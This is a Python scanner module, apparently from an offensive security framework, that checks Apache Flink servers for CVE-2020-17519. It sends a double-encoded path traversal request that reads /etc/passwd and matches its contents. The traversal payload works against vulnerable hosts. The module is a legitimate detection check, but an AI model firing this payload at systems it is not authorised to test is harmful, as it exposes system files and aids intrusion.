#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Flink 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Flink - Local File Inclusion Detection',
        'description': 'Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process (aka local file inclusion).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'apache', 'lfi', 'flink', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/B1anda0/CVE-2020-17519',
            'https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E',
            'https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d@%3Cdev.flink.apache.org%3E',
            'https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d@%3Cuser.flink.apache.org%3E',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-17519',
        ],
        'cve': 'CVE-2020-17519',
    }

    def run(self):
        r = self.http_request(method="GET", path='/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Apache Flink - Local File Inclusion detected",
                path='/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
            )
            return True
        return False

